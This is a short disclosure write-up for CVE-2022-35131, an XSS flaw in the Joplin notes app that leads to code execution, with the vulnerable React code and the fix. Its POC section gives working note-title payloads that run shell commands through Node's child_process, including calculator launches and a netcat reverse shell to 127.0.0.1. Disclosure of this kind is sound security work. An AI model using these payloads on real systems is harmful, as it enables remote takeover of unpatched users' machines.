# Joplin CVE-2022-35131
XSS leading to RCE in Joplin affecting version 2.8.8 and earlier. Tested and works on Windows and Linux.

Reported and fixed: 2022-06
## Technical overview

1. Create a note with javascript payload as title (POC:s bellow)
2. Press `Ctrl+P` and search for something in the note or title
3. Payload is executed when shown in the search result
4. Remote code execution can be achieved by sharing the notebook

Problem is because `dangerouslySetInnerHTML` is used with unescaped user input in `GotoAnything.tsx` line `509`. Fix by escaping user input.
```javascript
return (
  <div key={item.id} className={isSelected ? 'selected' : null} style={rowStyle} onClick={this.listItem_onClick} data-id={item.id} data-parent-id={item.parent_id} data-type={item.type}>
    <div style={style.rowTitle} dangerouslySetInnerHTML={{ __html: titleHtml }}></div>
    {fragmentComp}
    {pathComp}
  </div>
);
```


## POC
Space can not be used in payload, but encoded space `\x20` can be used.

Example tile payloads:
```javascript
# Payload 1 (Linux)
zzz<img src =q onerror=eval("require('child_process').exec('mate-calc');");>

# Payload 2 (Windows)
zzz<img src =q onerror=eval("require('child_process').exec('calc.exe');");>

# Reverse shell (Linux)
zzz<img src =q onerror=eval("require('child_process').exec('/bin/nc\x20-e\x20/bin/bash\x20127.0.0.1\x205000');");>
```

Search for `zzz` to execute payload.
